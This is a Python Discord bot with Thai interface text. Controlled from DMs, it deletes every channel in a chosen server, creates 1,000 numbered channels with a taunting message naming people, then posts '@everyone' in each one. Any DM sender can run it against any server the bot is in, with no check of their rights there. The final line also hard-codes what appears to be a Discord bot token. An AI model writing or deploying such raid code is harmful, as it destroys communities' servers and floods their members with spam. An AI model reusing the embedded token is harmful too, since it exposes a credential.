import discord
from discord.ext import commands, tasks 
from discord.ui import Button, View, Select
from flask import Flask
import asyncio
import os
import threading

app = Flask('')

@app.route('/')
def home():
    return "Bot is running!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
    
def keep_alive():
    t = threading.Thread(target=run)
    t.start()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.dm_messages = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

channel_creation_status = {}
server_info = {}
created_channels = {}  # เก็บข้อมูลช่องที่สร้าง

class ServerSelectView(View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.select(
        placeholder="เลือกเซิฟเวอร์",
        min_values=1,
        max_values=1,
        custom_id="server_select",
        options=[]  
    )
    async def select_callback(self, interaction: discord.Interaction, select: discord.ui.Select):
        try:
            selected_server_id = select.values[0]
            server_name = server_info.get(selected_server_id, "Unknown Server")
            
            confirm_view = ConfirmView(selected_server_id, server_name)
            await interaction.response.send_message(
                f"**{server_name}** ที่เลือก\nเริ่มทำการสร้างช่องเซิฟเวอร์เลยไหม?",
                view=confirm_view
            )
        except Exception as e:
            print(f"Error in select_callback: {e}")
            await interaction.response.send_message("❌ เกิดข้อผิดพลาดในการเลือกเซิฟเวอร์", ephemeral=True)

class ConfirmView(View):
    def __init__(self, server_id, server_name):
        super().__init__(timeout=None)
        self.server_id = server_id
        self.server_name = server_name
    
    @discord.ui.button(label="เริ่ม", style=discord.ButtonStyle.green, custom_id="confirm_start")
    async def start_button(self, interaction: discord.Interaction, button: Button):
        try:
            for child in self.children:
                child.disabled = True
            
            await interaction.response.edit_message(view=self)
            
            await self.start_channel_creation(interaction)
        except Exception as e:
            print(f"Error in start_button: {e}")
            await interaction.followup.send("❌ เกิดข้อผิดพลาดในการเริ่มต้น", ephemeral=True)
    
    @discord.ui.button(label="ไม่", style=discord.ButtonStyle.red, custom_id="confirm_cancel")
    async def cancel_button(self, interaction: discord.Interaction, button: Button):
        try:
            for child in self.children:
                child.disabled = True
            
            await interaction.response.edit_message(
                content="❌ การสร้างช่องเซิฟเวอร์ถูกยกเลิก",
                view=self
            )
        except Exception as e:
            print(f"Error in cancel_button: {e}")
            await interaction.response.send_message("❌ เกิดข้อผิดพลาด", ephemeral=True)
    
    async def start_channel_creation(self, interaction):
        """เริ่มกระบวนการสร้างช่อง"""
        user_id = interaction.user.id
        
        channel_creation_status[user_id] = {
            'server_name': self.server_name,
            'server_id': self.server_id,
            'current_channel': 0,
            'total_channels': 1000,
            'is_running': True,
            'progress_message': None,
            'task': None,
            'dm_channel': interaction.channel,  # เก็บช่อง DM
            'channels_created': []  # เก็บรายการช่องที่สร้าง
        }
        
        embed = discord.Embed(
            title="🚀 เริ่มกระบวนการสร้างช่อง",
            description=f"**เซิฟเวอร์:** {self.server_name}",
            color=discord.Color.blue()
        )
        embed.add_field(name="สถานะ", value="กำลังเริ่มต้น...", inline=True)
        embed.add_field(name="ความคืบหน้า", value="0/1000", inline=True)
        embed.add_field(name="การดำเนินการ", value="ลบช่องเดิมและสร้างช่องใหม่ 0001-1000", inline=False)
        
        progress_view = ProgressView(user_id, self.server_name, self.server_id)
        progress_msg = await interaction.followup.send(embed=embed, view=progress_view)
        
        channel_creation_status[user_id]['progress_message'] = progress_msg
        
        task = asyncio.create_task(self.create_channels(user_id, progress_msg))
        channel_creation_status[user_id]['task'] = task
    
    async def create_channels(self, user_id, progress_msg):
        """สร้างช่องด้วยความคืบหน้า"""
        status = channel_creation_status.get(user_id)
        if not status:
            return
        
        guild = bot.get_guild(int(status['server_id']))
        if not guild:
            embed = discord.Embed(
                title="❌ เกิดข้อผิดพลาด",
                description="ไม่พบเซิฟเวอร์ที่เลือก",
                color=discord.Color.red()
            )
            await progress_msg.edit(embed=embed)
            return
        
        progress_view = ProgressView(user_id, status['server_name'], status['server_id'])
        
        try:
            # ลบช่องเดิม
            embed = discord.Embed(
                title="🗑️ กำลังลบช่องเดิมทั้งหมด",
                description=f"**เซิฟเวอร์:** {status['server_name']}",
                color=discord.Color.orange()
            )
            embed.add_field(name="สถานะ", value="กำลังลบช่องพูดคุย...", inline=True)
            embed.add_field(name="ความคืบหน้า", value="เตรียมการ", inline=True)
            
            await progress_msg.edit(embed=embed, view=progress_view)
            
            deleted_count = 0
            channels_to_delete = list(guild.channels)
            
            for channel in channels_to_delete:
                try:
                    if status['is_running']:
                        await channel.delete()
                        deleted_count += 1
                        await asyncio.sleep(0.2) 
                    else:
                        break
                except Exception as e:
                    print(f"Error deleting channel {channel.name}: {e}")
            
            if not status['is_running']:
                return
            
            embed = discord.Embed(
                title="✅ ลบช่องเดิมเรียบร้อย",
                description=f"**เซิฟเวอร์:** {status['server_name']}",
                color=discord.Color.green()
            )
            embed.add_field(name="สถานะ", value="ลบช่องเรียบร้อย", inline=True)
            embed.add_field(name="จำนวนที่ลบ", value=f"{deleted_count} ช่อง", inline=True)
            embed.add_field(name="ขั้นตอนต่อไป", value="กำลังสร้างช่องใหม่...", inline=False)
            
            await progress_msg.edit(embed=embed, view=progress_view)
            await asyncio.sleep(1)
            
            # สร้าง 1000 ช่อง
            for i in range(1, 1001):
                if not status['is_running']:
                    embed = discord.Embed(
                        title="⏸️ หยุดชั่วคราว",
                        description=f"**เซิฟเวอร์:** {status['server_name']}",
                        color=discord.Color.orange()
                    )
                    embed.add_field(name="สถานะ", value="หยุดชั่วคราว", inline=True)
                    embed.add_field(name="ความคืบหน้า", value=f"{i-1}/1000", inline=True)
                    embed.add_field(name="ช่องล่าสุด", value=f"{(i-1):04d}" if i > 1 else "0000", inline=True)
                    
                    await progress_msg.edit(embed=embed, view=progress_view)
                    return
                
                status['current_channel'] = i
                
                try:
                    channel_name = f"{i:04d}"
                    channel = await guild.create_text_channel(channel_name)
                    
                    # เก็บข้อมูลช่องที่สร้าง
                    status['channels_created'].append({
                        'id': channel.id,
                        'name': channel_name,
                        'mention': channel.mention
                    })
                    
                    # สร้าง embed สำหรับประกาศ
                    announce_embed = discord.Embed(
                        title="🎉 ช่องพร้อมใช้งานแล้ว!",
                        description=f"ช่อง **{channel_name}** พร้อมใช้งานแล้วไอแต๊ก,โอ๋,ตุ๊ก",
                        color=discord.Color.green()
                    )
                    
                    # ส่งแค่ embed อย่างเดียว (ไม่มีปุ่มในช่องเซิฟเวอร์)
                    await channel.send(embed=announce_embed)
                    
                except Exception as e:
                    print(f"Error creating channel {i}: {e}")
                
                if i % 50 == 0 or i <= 10 or i >= 990:
                    embed = discord.Embed(
                        title="🔨 กำลังสร้างช่อง...",
                        description=f"**เซิฟเวอร์:** {status['server_name']}",
                        color=discord.Color.gold()
                    )
                    embed.add_field(name="สถานะ", value="กำลังสร้าง...", inline=True)
                    embed.add_field(name="ความคืบหน้า", value=f"{i}/1000", inline=True)
                    embed.add_field(name="ช่องล่าสุด", value=f"{i:04d}", inline=True)
                    embed.add_field(name="ประมาณการ", value=f"{(i/1000)*100:.1f}%", inline=True)
                    
                    await progress_msg.edit(embed=embed, view=progress_view)
                
                await asyncio.sleep(0.1)
            
            if status['is_running']:
                # เมื่อสร้างครบแล้ว ส่งปุ่ม Step 2 ไปใน DM
                embed = discord.Embed(
                    title="✅ การสร้างช่องเซิฟเวอร์เสร็จสิ้น",
                    description=f"**เซิฟเวอร์:** {status['server_name']}",
                    color=discord.Color.green()
                )
                embed.add_field(name="สถานะ", value="เสร็จสมบูรณ์", inline=True)
                embed.add_field(name="ช่องที่สร้าง", value="0001 ถึง 1000", inline=True)
                embed.add_field(name="ทั้งหมด", value="1000 ช่อง", inline=True)
                embed.add_field(name="ขั้นตอนต่อไป", value="กดปุ่ม **Step 2** ด้านล่างเพื่อแท็กทุกคนในแต่ละช่อง", inline=False)
                
                for child in progress_view.children:
                    child.disabled = True
                
                await progress_msg.edit(embed=embed, view=progress_view)
                
                # ส่งปุ่ม Step 2 ใน DM
                step2_embed = discord.Embed(
                    title="🚀 พร้อมสำหรับ Step 2",
                    description=f"**เซิฟเวอร์:** {status['server_name']}\nคุณสามารถแท็กทุกคนในแต่ละช่องได้แล้ว!",
                    color=discord.Color.purple()
                )
                step2_embed.add_field(name="จำนวนช่อง", value="1000 ช่อง", inline=True)
                step2_embed.add_field(name="การดำเนินการ", value="จะส่ง `@everyone` ไปยังทุกช่อง", inline=True)
                step2_embed.add_field(name="หมายเหตุ", value="กระบวนการอาจใช้เวลาบ้างเนื่องจากจำนวนช่องที่มาก", inline=False)
                
                step2_view = Step2DMView(user_id, status['server_id'], status['channels_created'])
                await status['dm_channel'].send(embed=step2_embed, view=step2_view)
                
        except Exception as e:
            print(f"Error in create_channels: {e}")
            embed = discord.Embed(
                title="❌ เกิดข้อผิดพลาด",
                description=f"**เซิฟเวอร์:** {status['server_name']}",
                color=discord.Color.red()
            )
            embed.add_field(name="ข้อผิดพลาด", value=str(e), inline=False)
            await progress_msg.edit(embed=embed)
        
        finally:
            # ลบสถานะเมื่อเสร็จสิ้น
            if user_id in channel_creation_status:
                del channel_creation_status[user_id]

class Step2DMView(View):
    """ปุ่ม Step 2 ใน DM สำหรับแท็กทุกคน"""
    def __init__(self, user_id, server_id, channels_list):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.server_id = server_id
        self.channels_list = channels_list
        self.is_running = False
        self.task = None
    
    @discord.ui.button(label="Step 2 - แท็กทุกช่อง", style=discord.ButtonStyle.primary, custom_id="step2_all_channels", emoji="🚀")
    async def step2_button(self, interaction: discord.Interaction, button: Button):
        try:
            if interaction.user.id != self.user_id:
                await interaction.response.send_message("❌ คุณไม่มีสิทธิ์ใช้ปุ่มนี้", ephemeral=True)
                return
            
            if self.is_running:
                await interaction.response.send_message("⚠️ กระบวนการกำลังทำงานอยู่", ephemeral=True)
                return
            
            self.is_running = True
            button.disabled = True
            
            await interaction.response.edit_message(view=self)
            
            # ส่งข้อความยืนยัน
            confirm_embed = discord.Embed(
                title="🚀 เริ่ม Step 2",
                description="กำลังเริ่มแท็กทุกคนในแต่ละช่อง...",
                color=discord.Color.blue()
            )
            confirm_embed.add_field(name="จำนวนช่อง", value=f"{len(self.channels_list)} ช่อง", inline=True)
            confirm_embed.add_field(name="สถานะ", value="กำลังเริ่มต้น...", inline=True)
            
            progress_msg = await interaction.followup.send(embed=confirm_embed)
            
            # เริ่มกระบวนการแท็ก
            self.task = asyncio.create_task(self.tag_everyone_in_channels(interaction, progress_msg))
            
        except Exception as e:
            print(f"Error in step2_button: {e}")
            await interaction.response.send_message("❌ เกิดข้อผิดพลาด", ephemeral=True)
    
    async def tag_everyone_in_channels(self, interaction, progress_msg):
        """แท็ก @everyone ในทุกช่อง"""
        try:
            guild = bot.get_guild(int(self.server_id))
            if not guild:
                error_embed = discord.Embed(
                    title="❌ เกิดข้อผิดพลาด",
                    description="ไม่พบเซิฟเวอร์",
                    color=discord.Color.red()
                )
                await progress_msg.edit(embed=error_embed)
                return
            
            total_channels = len(self.channels_list)
            completed = 0
            failed = 0
            
            for i, channel_info in enumerate(self.channels_list, 1):
                try:
                    channel = guild.get_channel(channel_info['id'])
                    if channel:
                        # ส่ง @everyone ในช่อง
                        await channel.send("@everyone")
                        completed += 1
                        
                        # อัพเดทความคืบหน้าทุก 50 ช่อง
                        if i % 50 == 0 or i <= 10 or i >= 990:
                            progress_embed = discord.Embed(
                                title="🔨 กำลังแท็กทุกคน...",
                                description=f"**เซิฟเวอร์:** {guild.name}",
                                color=discord.Color.gold()
                            )
                            progress_embed.add_field(name="สถานะ", value="กำลังแท็ก...", inline=True)
                            progress_embed.add_field(name="ความคืบหน้า", value=f"{i}/{total_channels}", inline=True)
                            progress_embed.add_field(name="สำเร็จ", value=f"{completed} ช่อง", inline=True)
                            progress_embed.add_field(name="ล้มเหลว", value=f"{failed} ช่อง", inline=True)
                            progress_embed.add_field(name="ช่องล่าสุด", value=f"{channel_info['name']}", inline=True)
                            progress_embed.add_field(name="ประมาณการ", value=f"{(i/total_channels)*100:.1f}%", inline=True)
                            
                            await progress_msg.edit(embed=progress_embed)
                    
                    await asyncio.sleep(0.5)  # หน่วงเวลาเพื่อป้องกัน rate limit
                    
                except Exception as e:
                    print(f"Error tagging in channel {channel_info['name']}: {e}")
                    failed += 1
            
            # เมื่อเสร็จสิ้น
            final_embed = discord.Embed(
                title="✅ Step 2 เสร็จสิ้น",
                description=f"**เซิฟเวอร์:** {guild.name}",
                color=discord.Color.green()
            )
            final_embed.add_field(name="สถานะ", value="เสร็จสมบูรณ์", inline=True)
            final_embed.add_field(name="ช่องทั้งหมด", value=f"{total_channels} ช่อง", inline=True)
            final_embed.add_field(name="แท็กสำเร็จ", value=f"{completed} ช่อง", inline=True)
            final_embed.add_field(name="แท็กล้มเหลว", value=f"{failed} ช่อง", inline=True)
            
            await progress_msg.edit(embed=final_embed)
            
        except Exception as e:
            print(f"Error in tag_everyone_in_channels: {e}")
            error_embed = discord.Embed(
                title="❌ เกิดข้อผิดพลาด",
                description=str(e),
                color=discord.Color.red()
            )
            await progress_msg.edit(embed=error_embed)
        
        finally:
            self.is_running = False
    
    @discord.ui.button(label="ยกเลิก", style=discord.ButtonStyle.red, custom_id="step2_cancel", emoji="❌")
    async def cancel_button(self, interaction: discord.Interaction, button: Button):
        try:
            if interaction.user.id != self.user_id:
                await interaction.response.send_message("❌ คุณไม่มีสิทธิ์ใช้ปุ่มนี้", ephemeral=True)
                return
            
            if self.task:
                self.task.cancel()
                self.is_running = False
            
            for child in self.children:
                child.disabled = True
            
            await interaction.response.edit_message(view=self)
            
            cancel_embed = discord.Embed(
                title="❌ ยกเลิก Step 2",
                description="การแท็กทุกคนถูกยกเลิก",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=cancel_embed)
            
        except Exception as e:
            print(f"Error in cancel_button: {e}")
            await interaction.response.send_message("❌ เกิดข้อผิดพลาด", ephemeral=True)

class ProgressView(View):
    def __init__(self, user_id, server_name, server_id):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.server_name = server_name
        self.server_id = server_id
    
    @discord.ui.button(label="หยุด", style=discord.ButtonStyle.red, custom_id="progress_stop", emoji="⏸️")
    async def stop_button(self, interaction: discord.Interaction, button: Button):
        try:
            if interaction.user.id != self.user_id:
                await interaction.response.send_message("❌ คุณไม่มีสิทธิ์ควบคุมกระบวนการนี้", ephemeral=True)
                return
            
            status = channel_creation_status.get(self.user_id)
            if status:
                status['is_running'] = False
            
            for child in self.children:
                if child.custom_id == "progress_stop":
                    child.disabled = True
                elif child.custom_id == "progress_continue":
                    child.disabled = False
            
            await interaction.response.edit_message(view=self)
            await interaction.followup.send("⏸️ หยุดกระบวนการสร้างช่องชั่วคราวแล้ว", ephemeral=True)
            
        except Exception as e:
            print(f"Error in stop_button: {e}")
            await interaction.response.send_message("❌ เกิดข้อผิดพลาด", ephemeral=True)
    
    @discord.ui.button(label="ทำต่อ", style=discord.ButtonStyle.green, custom_id="progress_continue", emoji="▶️", disabled=True)
    async def continue_button(self, interaction: discord.Interaction, button: Button):
        try:
            if interaction.user.id != self.user_id:
                await interaction.response.send_message("❌ คุณไม่มีสิทธิ์ควบคุมกระบวนการนี้", ephemeral=True)
                return
            
            status = channel_creation_status.get(self.user_id)
            if status and not status['is_running']:
                status['is_running'] = True
                
                progress_msg = status['progress_message']
                progress_view = ProgressView(self.user_id, self.server_name, self.server_id)
                
                for child in progress_view.children:
                    if child.custom_id == "progress_stop":
                        child.disabled = False
                    elif child.custom_id == "progress_continue":
                        child.disabled = True
                
                embed = discord.Embed(
                    title="▶️ ดำเนินการต่อ",
                    description=f"**เซิฟเวอร์:** {self.server_name}",
                    color=discord.Color.green()
                )
                embed.add_field(name="สถานะ", value="กำลังสร้างต่อ...", inline=True)
                embed.add_field(name="ความคืบหน้า", value=f"{status['current_channel']}/1000", inline=True)
                embed.add_field(name="ช่องต่อไป", value=f"{status['current_channel'] + 1:04d}", inline=True)
                
                await progress_msg.edit(embed=embed, view=progress_view)
                
                task = asyncio.create_task(self.continue_creation(self.user_id, progress_msg))
                status['task'] = task
            
            await interaction.response.edit_message(view=self)
            
        except Exception as e:
            print(f"Error in continue_button: {e}")
            await interaction.response.send_message("❌ เกิดข้อผิดพลาด", ephemeral=True)
    
    async def continue_creation(self, user_id, progress_msg):
        """ดำเนินการสร้างช่องต่อจากจุดที่หยุด"""
        status = channel_creation_status.get(user_id)
        if not status:
            return
        
        guild = bot.get_guild(int(status['server_id']))
        if not guild:
            embed = discord.Embed(
                title="❌ เกิดข้อผิดพลาด",
                description="ไม่พบเซิฟเวอร์ที่เลือก",
                color=discord.Color.red()
            )
            await progress_msg.edit(embed=embed)
            return
        
        progress_view = ProgressView(user_id, status['server_name'], status['server_id'])
        
        try:
            start_channel = status['current_channel'] + 1
            for i in range(start_channel, 1001):
                if not status['is_running']:
                    return
                
                status['current_channel'] = i
                
                try:
                    channel_name = f"{i:04d}"
                    channel = await guild.create_text_channel(channel_name)
                    
                    # เก็บข้อมูลช่องที่สร้าง
                    status['channels_created'].append({
                        'id': channel.id,
                        'name': channel_name,
                        'mention': channel.mention
                    })
                    
                    announce_embed = discord.Embed(
                        title="🎉 ช่องพร้อมใช้งานแล้ว!",
                        description=f"ช่อง **{channel_name}** พร้อมใช้งานแล้ว",
                        color=discord.Color.green()
                    )
                    
                    await channel.send(embed=announce_embed)
                    
                except Exception as e:
                    print(f"Error creating channel {i}: {e}")
                
                if i % 50 == 0 or i <= 10 or i >= 990:
                    embed = discord.Embed(
                        title="🔨 กำลังสร้างช่อง...",
                        description=f"**เซิฟเวอร์:** {status['server_name']}",
                        color=discord.Color.gold()
                    )
                    embed.add_field(name="สถานะ", value="กำลังสร้าง...", inline=True)
                    embed.add_field(name="ความคืบหน้า", value=f"{i}/1000", inline=True)
                    embed.add_field(name="ช่องล่าสุด", value=f"{i:04d}", inline=True)
                    embed.add_field(name="ประมาณการ", value=f"{(i/1000)*100:.1f}%", inline=True)
                    
                    await progress_msg.edit(embed=embed, view=progress_view)
                
                await asyncio.sleep(0.1)
            
            if status['is_running']:
                embed = discord.Embed(
                    title="✅ การสร้างช่องเซิฟเวอร์เสร็จสิ้น",
                    description=f"**เซิฟเวอร์:** {status['server_name']}",
                    color=discord.Color.green()
                )
                embed.add_field(name="สถานะ", value="เสร็จสมบูรณ์", inline=True)
                embed.add_field(name="ช่องที่สร้าง", value="0001 ถึง 1000", inline=True)
                embed.add_field(name="ทั้งหมด", value="1000 ช่อง", inline=True)
                embed.add_field(name="ขั้นตอนต่อไป", value="กดปุ่ม **Step 2** ด้านล่างเพื่อแท็กทุกคนในแต่ละช่อง", inline=False)
                
                for child in progress_view.children:
                    child.disabled = True
                
                await progress_msg.edit(embed=embed, view=progress_view)
                
                # ส่งปุ่ม Step 2 ใน DM
                step2_embed = discord.Embed(
                    title="🚀 พร้อมสำหรับ Step 2",
                    description=f"**เซิฟเวอร์:** {status['server_name']}\nคุณสามารถแท็กทุกคนในแต่ละช่องได้แล้ว!",
                    color=discord.Color.purple()
                )
                step2_embed.add_field(name="จำนวนช่อง", value="1000 ช่อง", inline=True)
                step2_embed.add_field(name="การดำเนินการ", value="จะส่ง `@everyone` ไปยังทุกช่อง", inline=True)
                
                step2_view = Step2DMView(user_id, status['server_id'], status['channels_created'])
                await status['dm_channel'].send(embed=step2_embed, view=step2_view)
                
        except Exception as e:
            print(f"Error in continue_creation: {e}")
            embed = discord.Embed(
                title="❌ เกิดข้อผิดพลาด",
                description=f"**เซิฟเวอร์:** {status['server_name']}",
                color=discord.Color.red()
            )
            embed.add_field(name="ข้อผิดพลาด", value=str(e), inline=False)
            await progress_msg.edit(embed=embed)
        
        finally:
            if user_id in channel_creation_status:
                del channel_creation_status[user_id]
    
    @discord.ui.button(label="ยกเลิก", style=discord.ButtonStyle.gray, custom_id="progress_cancel", emoji="❌")
    async def cancel_button(self, interaction: discord.Interaction, button: Button):
        try:
            if interaction.user.id != self.user_id:
                await interaction.response.send_message("❌ คุณไม่มีสิทธิ์ควบคุมกระบวนการนี้", ephemeral=True)
                return
            
            if self.user_id in channel_creation_status:
                status = channel_creation_status[self.user_id]
                if status['task']:
                    status['task'].cancel()
                del channel_creation_status[self.user_id]
            
            for child in self.children:
                child.disabled = True
            
            embed = discord.Embed(
                title="❌ ยกเลิกกระบวนการ",
                description=f"**เซิฟเวอร์:** {self.server_name}",
                color=discord.Color.red()
            )
            embed.add_field(name="สถานะ", value="ยกเลิกแล้ว", inline=True)
            
            await interaction.response.edit_message(embed=embed, view=self)
            await interaction.followup.send("✅ ยกเลิกกระบวนการสร้างช่องเรียบร้อยแล้ว", ephemeral=True)
            
        except Exception as e:
            print(f"Error in cancel_button: {e}")
            await interaction.response.send_message("❌ เกิดข้อผิดพลาด", ephemeral=True)

@tasks.loop(seconds=30)
async def check_servers():
    """ตรวจสอบเซิฟเวอร์ทุก 30 วินาที"""
    try:
        current_servers = {str(guild.id): guild.name for guild in bot.guilds}
        
        if current_servers != server_info:
            server_info.clear()
            server_info.update(current_servers)
            
    except Exception as e:
        pass

@bot.event
async def on_ready():
    print(f'{bot.user} has logged in successfully!')
    print(f'Bot is in {len(bot.guilds)} guilds')
    
    server_info.clear()
    for guild in bot.guilds:
        server_info[str(guild.id)] = guild.name
        print(f' - {guild.name} (ID: {guild.id})')
    
    check_servers.start()
    print('✅ บอทพร้อมทำงานแล้ว!')

@bot.event
async def on_guild_join(guild):
    """เมื่อบอทเข้าเซิฟเวอร์ใหม่"""
    server_info[str(guild.id)] = guild.name

@bot.event
async def on_guild_remove(guild):
    """เมื่อบอทออกจากเซิฟเวอร์"""
    server_info.pop(str(guild.id), None)

@bot.event
async def on_message(message):
    if isinstance(message.channel, discord.DMChannel) and not message.author.bot:
        if bot.user.mentioned_in(message) or message.content.lower().startswith('!start'):
            if not server_info:
                await message.channel.send("❌ บอทไม่ได้อยู่ในเซิฟเวอร์ใดๆ")
                return
            
            embed = discord.Embed(
                title="🔧 ระบบจัดการเซิฟเวอร์",
                description="กรุณาเลือกเซิฟเวอร์ที่ต้องการจัดการจากเมนูด้านล่าง",
                color=discord.Color.blue()
            )
            
            server_list = "\n".join([f"• {name}" for name in server_info.values()])
            embed.add_field(
                name="📋 เซิฟเวอร์ที่พร้อมใช้งาน",
                value=server_list or "ไม่พบเซิฟเวอร์",
                inline=False
            )
            
            embed.add_field(
                name="⚙️ ขั้นตอนการทำงาน",
                value="1. เลือกเซิฟเวอร์\n2. ยืนยันการสร้างช่อง\n3. ดูความคืบหน้าแบบเรียลไทม์\n4. สามารถหยุด/ทำต่อได้",
                inline=False
            )
            
            class InitialServerSelectView(View):
                def __init__(self):
                    super().__init__(timeout=None)
                
                @discord.ui.select(
                    placeholder="เลือกเซิฟเวอร์",
                    min_values=1,
                    max_values=1,
                    custom_id="initial_server_select",
                    options=[discord.SelectOption(label=name, value=gid) for gid, name in server_info.items()]
                )
                async def select_callback(self, interaction: discord.Interaction, select: discord.ui.Select):
                    try:
                        selected_guild_id = select.values[0]
                        server_name = server_info.get(selected_guild_id, "Unknown Server")
                        
                        confirm_view = ConfirmView(selected_guild_id, server_name)
                        await interaction.response.send_message(
                            f"**{server_name}** ที่เลือก\nเริ่มทำการสร้างช่องเซิฟเวอร์เลยไหม?",
                            view=confirm_view
                        )
                    except Exception as e:
                        print(f"Error in initial select: {e}")
                        await interaction.response.send_message("❌ เกิดข้อผิดพลาดในการเลือกเซิฟเวอร์", ephemeral=True)
            
            view = InitialServerSelectView()
            await message.channel.send(embed=embed, view=view)
    
    await bot.process_commands(message)

@bot.command()
async def start(ctx):
    """เริ่มต้นระบบในแชทส่วนตัว"""
    if isinstance(ctx.channel, discord.DMChannel):
        if not server_info:
            await ctx.send("❌ บอทไม่ได้อยู่ในเซิฟเวอร์ใดๆ")
            return
        
        embed = discord.Embed(
            title="🔧 ระบบจัดการเซิฟเวอร์",
            description="กรุณาเลือกเซิฟเวอร์ที่ต้องการจัดการจากเมนูด้านล่าง",
            color=discord.Color.blue()
        )
        
        server_list = "\n".join([f"• {name}" for name in server_info.values()])
        embed.add_field(
            name="📋 เซิฟเวอร์ที่พร้อมใช้งาน",
            value=server_list,
            inline=False
        )
        
        class CommandServerSelectView(View):
            def __init__(self):
                super().__init__(timeout=None)
            
            @discord.ui.select(
                placeholder="เลือกเซิฟเวอร์",
                min_values=1,
                max_values=1,
                custom_id="command_server_select",
                options=[discord.SelectOption(label=name, value=gid) for gid, name in server_info.items()]
            )
            async def select_callback(self, interaction: discord.Interaction, select: discord.ui.Select):
                try:
                    selected_guild_id = select.values[0]
                    server_name = server_info.get(selected_guild_id, "Unknown Server")
                    
                    confirm_view = ConfirmView(selected_guild_id, server_name)
                    await interaction.response.send_message(
                        f"**{server_name}** ที่เลือก\nเริ่มทำการสร้างช่องเซิฟเวอร์เลยไหม?",
                        view=confirm_view
                    )
                except Exception as e:
                    print(f"Error in command select: {e}")
                    await interaction.response.send_message("❌ เกิดข้อผิดพลาดในการเลือกเซิฟเวอร์", ephemeral=True)
        
        view = CommandServerSelectView()
        await ctx.send(embed=embed, view=view)
    else:
        await ctx.send("⚠️ คำสั่งนี้ใช้งานได้เฉพาะในแชทส่วนตัวเท่านั้น")

if __name__ == "__main__":
    bot.run(os.environ.get('MTQ2MDI5NjU2NjMzNzQzNzk2Mw.G5QoVe.cnS25NQGSwWab3l4BaNXIQdBeDlLjfzNi5a_SM'))